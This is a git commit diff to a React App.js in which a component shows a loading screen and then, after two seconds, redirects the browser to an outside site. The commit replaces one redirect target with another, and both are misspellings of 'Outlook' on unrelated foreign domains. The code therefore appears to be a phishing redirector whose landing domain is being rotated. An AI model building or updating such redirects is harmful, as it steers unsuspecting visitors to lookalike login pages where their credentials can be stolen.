40af0a58214067d2bef60d97ac1650b35effacca
husknet <127146284+husknet@users.noreply.github.com>
2024-12-03 16:02:53 +0000

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://outbook.neurowyjatkowi.pl/';
+            window.location.href = 'https://outloox.dinprima.ro/';
         }, 2000);
 
         return () => clearTimeout(timer);
